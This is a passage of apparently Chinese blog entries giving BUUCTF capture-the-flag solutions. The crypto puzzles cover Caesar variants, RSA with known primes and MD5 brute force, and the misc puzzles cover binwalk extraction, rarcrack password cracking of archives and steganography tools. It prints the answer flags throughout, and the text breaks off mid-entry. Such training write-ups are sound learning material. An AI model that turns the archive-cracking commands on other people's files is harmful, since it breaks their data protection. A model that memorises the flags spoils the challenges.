class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">b_kaisa</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    first_step <span class="token operator">=</span> <span class="token number">5</span> <span class="token comment">#首位ascii码的位移步长</span>    i <span class="token operator">=</span> <span class="token number">0</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        as_num <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#将数据序列变为ascii码</span>        as_num <span class="token operator">+=</span> first_step        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>as_num<span class="token punctuation">)</span> <span class="token comment">#将变为ascii码后的数据序列加入数组</span>        first_step <span class="token operator">+=</span> <span class="token number">1</span>        i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> resultquestion <span class="token operator">=</span> <span class="token string">'afZ_r9VYfScOeO_UL^RWUc'</span>result <span class="token operator">=</span> b_kaisa<span class="token punctuation">(</span>question<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment">#由于函数体返回的是一个ascii码的数据序列，类型为列表，我们要将他转化成字符串类型</span><span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag:<code>flag&#123;Caesar_variation&#125;</code></p><hr><h2 id="八-Quoted-printable"><a href="#八-Quoted-printable" class="headerlink" title="八.Quoted-printable"></a>八.Quoted-printable</h2><p>题目就是提示</p><p>下载附件，👉<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx/">在线Quoted-printable解码</a>，即可。</p><p>flag:<code>flag&#123;那你也很棒哦&#125;</code></p><hr><h2 id="九-Rabbit"><a href="#九-Rabbit" class="headerlink" title="九.Rabbit"></a>九.Rabbit</h2><p>题目就是提示，兔子加密解密</p><p>下载附件，👉<a href="https://www.sojson.com/encrypt_rabbit.html">rabbit在线解密</a>，在线解密即可。</p><p>flag:<code>flag&#123;Cute_Rabbit&#125;</code></p><hr><h2 id="十-篱笆墙的影子"><a href="#十-篱笆墙的影子" class="headerlink" title="十.篱笆墙的影子"></a>十.篱笆墙的影子</h2><p>提示如下</p><blockquote><p>星星还是那颗星星哟 月亮还是那个月亮 山也还是那座山哟 梁也还是那道梁 碾子是碾子 缸是缸哟 爹是爹来娘是娘 麻油灯呵还吱吱响 点的还是那么丁点亮 哦哦 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>我表示不懂，下载附件，打开附件，附件内容👉<code>felhaagv&#123;ewtehtehfilnakgw&#125;</code>，根据题目猜测应该是栅栏密码，在线解密👉<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏在线解密</a>，解密即可。</p><p>flag:<code>flag&#123;wethinkwehavetheflag&#125;</code></p><hr><h2 id="十一-RSA"><a href="#十一-RSA" class="headerlink" title="十一.RSA"></a>十一.RSA</h2><p>下载附件，附件内容如下，需要我们求出d，根据公式<code>(e*d)modφ(n)=1</code>,👉<a href="https://blog.takagisan.top/2022/02dd678d5e.html#toc-heading-15">RSA加密原理</a>。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">p=473398607161q=4511491e=17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>求φ(n)：<code>(p-1)(q-1)=(473398607161-1)*(4511491-1)=2135733082216268400</code>，根据公式计算出d为<code>125631357777427553</code>。</p><p>怎么可能是手算的，脚本如下。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">473398607161</span>q <span class="token operator">=</span> <span class="token number">4511491</span>e <span class="token operator">=</span> <span class="token number">17</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag:<code>flag&#123;125631357777427553&#125;</code></p><hr><h2 id="十二-丢失的MD5"><a href="#十二-丢失的MD5" class="headerlink" title="十二.丢失的MD5"></a>十二.丢失的MD5</h2><p>下载附件发现是python2代码，如下。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">'TASC'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'O3RJMV'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'WDJKX'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ZM'</span><span class="token punctuation">)</span>            des<span class="token operator">=</span>m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'e9032'</span> <span class="token keyword">in</span> des <span class="token keyword">and</span> <span class="token string">'da'</span> <span class="token keyword">in</span> des <span class="token keyword">and</span> <span class="token string">'911513'</span> <span class="token keyword">in</span> des<span class="token punctuation">:</span>                <span class="token keyword">print</span> des<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在python3里面不能运行，一眼发现错误。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span> des修改为<span class="token keyword">print</span><span class="token punctuation">(</span>dex<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行结果如下图👇</p><p><img src="/images/wordimage/20220211/encode.png"></p><p>意思是<code>必须在哈希之前对Unicode进行编码</code>，修改代码如下👇。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">'TASC'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'O3RJMV'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'WDJKX'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ZM'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            des<span class="token operator">=</span>m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'e9032'</span> <span class="token keyword">in</span> des <span class="token keyword">and</span> <span class="token string">'da'</span> <span class="token keyword">in</span> des <span class="token keyword">and</span> <span class="token string">'911513'</span> <span class="token keyword">in</span> des<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>des<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag:<code>flag&#123;e9032994dabac08080091151380478a2&#125;</code></p><hr><h2 id="十三-Alice与Bob"><a href="#十三-Alice与Bob" class="headerlink" title="十三.Alice与Bob"></a>十三.Alice与Bob</h2><p>提示如下</p><blockquote><p>密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>根据题目要求分解两个素数，👉<a href="http://www.jsons.cn/quality/">在线分解</a>，如果不用在线分解也可以使用python代码，代码👇。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入需要分解的整数:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                  <span class="token comment">#让用户输入数字</span>num<span class="token operator">=</span>n                           <span class="token comment">#赋值</span>m<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>                            <span class="token comment">#创建空列表</span><span class="token keyword">while</span> n<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>                     <span class="token comment">#判断如果n不是1，那么就循环</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment">#循环从2到n加1位数字</span>        <span class="token keyword">if</span> n <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token comment">#判断，如果n除以i的余数为0</span>            m<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#如果余数为0，那么就把i转换为字符串然后加入到m列表里面去</span>            n <span class="token operator">=</span> n<span class="token operator">//</span>i            <span class="token comment">#如果余数为0，那么用n来除以i做向下取整数</span>            <span class="token keyword">break</span>               <span class="token comment">#如果余数为0，结束循环</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"分解的素数为:"</span><span class="token punctuation">,</span>num<span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分解后，数字为<code>101999*966233</code>，重新组成数字为<code>101999966233</code>，将重新组成的数字进行md5的32位小写哈希👉<a href="https://www.cmd5.com/">在线MD5加密</a>，也可以使用python，如下代码👇。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'101999966233'</span>    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建md5对象</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#必须要进行encode编码</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token builtin">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为<code>d450209323a847c8d01c6be47c81811a</code>。</p><p>flag:<code>flag&#123;d450209323a847c8d01c6be47c81811a&#125;</code></p><hr><h2 id="十四-rsarsa"><a href="#十四-rsarsa" class="headerlink" title="十四.rsarsa"></a>十四.rsarsa</h2><p>这是让我眼前一黑的题，就是表面意思，眼前一黑，下载附件，反正大概意思就是求m，不懂rsa的可以看这篇文章👉<a href="https://blog.takagisan.top/2022/02dd678d5e.html#toc-heading-15">RSA</a>，套公式<strong>c^dmodn=m</strong>。</p><p>题目内容如下👇。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e =  65537c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>需要求d是多少，求d公式：<code>(e*d)modφ(n)=1</code>，φ(n)的求法就是(p-1)*(q-1)，数字太大，直接python脚本吧，如下👇，输出的结果就是d</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span>  <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>q <span class="token operator">=</span>  <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>e <span class="token operator">=</span>  <span class="token number">65537</span>c <span class="token operator">=</span>  <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终求m，python脚本如下，就是我自己写的( •̀ ω •́ )✧，虽然很简单233333。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span>  <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>q <span class="token operator">=</span>  <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>e <span class="token operator">=</span>  <span class="token number">65537</span>c <span class="token operator">=</span>  <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qfn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>fn<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>      <span class="token comment">#为c的d次方然后在对n取余数</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终m:<code>5577446633554466577768879988</code>，flag:<code>flag&#123;5577446633554466577768879988&#125;</code></p><hr><h2 id="十五-大帝的密码武器"><a href="#十五-大帝的密码武器" class="headerlink" title="十五.大帝的密码武器"></a>十五.大帝的密码武器</h2><p>下载下来的文件没有后缀需要修改为.zip文件解压，解压之后，发现有两个文件，题目的介绍一看就是凯撒👉<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">在线加密解密凯撒</a>，或者如下python代码👇，一个一个的看，发现移动十三位数是<code>security</code>是一个正常的单词，其他都不正常，由此判断是移动了13位，加密密文<code>ComeChina</code>也可以用如下代码移动13位，加密过后是<code>pbzrpuvan</code>，当然这个不是flag，需要把两个<code>p</code>变成大写(我就被坑了)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">caser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">"ComeChina"</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    dict_txt <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dict_txt<span class="token punctuation">[</span>dict_txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">#寻找i里面的dict_txt的索引值加上k</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"移动了%d位"</span><span class="token operator">%</span>k<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment">#每次循环完毕，列表清空</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    caser<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终flag:<code>flag&#123;PbzrPuvan&#125;</code></p><hr><h2 id="十六-Windows系统密码"><a href="#十六-Windows系统密码" class="headerlink" title="十六.Windows系统密码"></a>十六.Windows系统密码</h2><p>下载附件，使用记事本打开，👉<a href="https://cmd5.com/">md5在线解密</a>，发现一个ctf用户，第一个md5解密解不开，第二个解开了是<code>good-luck</code>，拿去提交，发现提交成功。</p><p>flag:<code>flag&#123;good-luck&#125;</code></p><hr><h2 id="十七-信息化时代的步伐"><a href="#十七-信息化时代的步伐" class="headerlink" title="十七.信息化时代的步伐"></a>十七.信息化时代的步伐</h2><p>提示如下</p><blockquote><p>也许中国可以早早进入信息化时代，但是被清政府拒绝了。附件中是数十年后一位伟人说的话的密文。请翻译出明文(答案为一串中文！) 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>打开附件一大串数字，根据提示，应该是中文电码，👉<a href="http://code.mcdvisa.com/">中文电码查询</a>，结果如下👇。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">6060：计4615：算2623：机6008：要1783：从1216：娃1216：娃2119：抓6386：起<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以,flag:<code>flag&#123;计算机要从娃娃抓起&#125;</code></p><p>计算机要从娃娃抓起——邓小平</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-Misc第一页(小明的保险箱-九连环)</title>
      <link href="/2022/014cfb2d5a.html"/>
      <url>/2022/014cfb2d5a.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章是BUUCTF第一页的后面十五题，也就是如标题所示，从小明的保险箱到九连环的解题思路，前十七题链接👉<a href="https://blog.takagisan.top/2022/0157b85665.html">签到-ningen</a>。</p><hr><h2 id="一-小明的保险箱"><a href="#一-小明的保险箱" class="headerlink" title="一.小明的保险箱"></a>一.小明的保险箱</h2><p>提示如下</p><blockquote><p>小明有一个保险箱，里面珍藏了小明的日记本，他记录了什么秘密呢？。。。告诉你，其实保险箱的密码四位纯数字密码。（答案格式：flag｛答案｝，只需提交答案） 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>看题目提示，大概知道应该又是暴力破解……..</p><p>下载附件是一张jpg图片，如下图。</p><p><img src="/images/wordimage/20220128/baoxianxiang.jpg"></p><p>是图片，这里使用二进制查看器，和Stegsolve查看只会发现都没啥东西，然后用Kali分离文件之后发现了一个加密rar压缩包，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk -e 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现压缩包需要解密，联合上面提示猜测是暴力破解，Kali暴力破解命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rarcrack 文件 --threads <span class="token number">10</span> --type <span class="token function">rar</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windows使用的是<code>ARCHPR</code>工具，没有工具百度下载即可，如下图破解成功口令，打开里面的txt文件就是flag</p><p><img src="/images/wordimage/20220128/7869.png"></p><p>flag:<code>flag&#123;75a3d68bf071ee188c418ea6cf0bb043&#125;</code></p><hr><h2 id="二-爱因斯坦"><a href="#二-爱因斯坦" class="headerlink" title="二.爱因斯坦"></a>二.爱因斯坦</h2><p>没有提示</p><p>下载附件发现是一张jpg文件，如下图。</p><p><img src="/images/wordimage/20220128/misc2.jpg"></p><p>使用Winhex和Stegsolve,均没有发现东西，还是去Kali分解文件，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk -e 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现了一个zip压缩包有密码，我的直觉告诉我应该是伪密码伪密码文章👉<a href="https://blog.takagisan.top/2022/017a75b1bc.html">伪加密</a>，然后一顿操作猛如虎解压的时候报错了CRC校验错误，应该不是伪密码，如下图是flag.txt里面的内容。</p><p><img src="/images/wordimage/20220128/flagtxt.png"></p><p>然后重新对图片下手，然后对着图片右键，属性 &gt; 详细信息，发现了这个东西，如下图。</p><p><img src="/images/wordimage/20220128/aystflag.png"></p><p>猜测是zip压缩包的密码，正确，打开解压后的txt文件里面就是flag。</p><p>flag:<code>flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125;</code></p><hr><h2 id="三-easycap"><a href="#三-easycap" class="headerlink" title="三.easycap"></a>三.easycap</h2><p>没有提示</p><p>下载附件发现是一个流量包</p><p>然后<code>ctrl + f</code>搜索没有发现flag，然后查看所有流量包，发现全是TCP，随便点一个tcp流量包，右键 &gt; 追踪流 &gt; TCP流，如下图，flag就出来了？？？？</p><p><img src="/images/wordimage/20220128/easycap.png"></p><p>flag:<code>flag&#123;385b87afc8671dee07550290d16a8071&#125;</code></p><hr><h2 id="四-隐藏的钥匙"><a href="#四-隐藏的钥匙" class="headerlink" title="四.隐藏的钥匙"></a>四.隐藏的钥匙</h2><p>提示如下</p><blockquote><p>路飞一行人千辛万苦来到了伟大航道的终点，找到了传说中的One piece，但是需要钥匙才能打开One Piece大门，钥匙就隐藏在下面的图片中，聪明的你能帮路飞拿到钥匙，打开One Piece的大门吗？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载附件，发现是一张jpg图片，如下图。</p><p><img src="/images/wordimage/20220128/thekey.jpg"></p><p>用Winhex打开直接搜索flag，如下图。</p><p><img src="/images/wordimage/20220128/base64.png"></p><p>base64解码之后，如👉字符串<code>377cbadda1eca2f2f73d36277781f00a</code>，以为要md5解密，其实这个就是flag！！</p><p>flag:<code>flag&#123;377cbadda1eca2f2f73d36277781f00a&#125;</code></p><hr><h2 id="五-另外一个世界"><a href="#五-另外一个世界" class="headerlink" title="五.另外一个世界"></a>五.另外一个世界</h2><p>没有提示</p><p>下载附件发现是一张jpt图片，如下图。</p><p><img src="/images/wordimage/20220128/monster.jpg"></p><p>使用Winhex打开，拉到最下面，发现了二进制数字，如下图。</p><p><img src="/images/wordimage/20220128/0101.png"></p><p>二进制解密试试，如下图。</p><p><img src="/images/wordimage/20220128/01010.png"></p><p>根据前面几个题的经验，这个应该就是，flag了。</p><p>flag:<code>flag&#123;koekj3s&#125;</code></p><hr><h2 id="六-FLAG"><a href="#六-FLAG" class="headerlink" title="六.FLAG"></a>六.FLAG</h2><p>没有提示，只是提示格式要换而已。。</p><p>下载附件发现是一张png图片，如下图。</p><p><img src="/images/wordimage/20220128/jiaolian.png"></p><p>使用winhex打开没啥可以发现的东西，但是用Stegsolve打开然后打开0通道，如下图，发现了东西。</p><p><img src="/images/wordimage/20220128/504b.png"></p><p>发现图片里面含有压缩包，直接Save Bin保存为zip文件，但是打开报错，说文件损坏，但是似乎还是可以解压，解压出一个文件是1。</p><p><img src="/images/wordimage/20220128/zipwenj.png"></p><p>然后搜索hctf，如下图，找到了flag</p><p><img src="/images/wordimage/20220128/hctf.png"></p><p>hctf{dd0gf4c3tok3yb0ard4g41n~~~}修改flag:<code>flag&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</code></p><hr><h2 id="七-假如给我三天光明"><a href="#七-假如给我三天光明" class="headerlink" title="七.假如给我三天光明"></a>七.假如给我三天光明</h2><p>没有提示</p><p>下载附件是一个jpg图片和一个zip压缩文件，zip压缩文件被加密了，打开图片，如下图,海伦凯勒这个人我记得，是一个盲人，这个图应该是盲文了</p><p><img 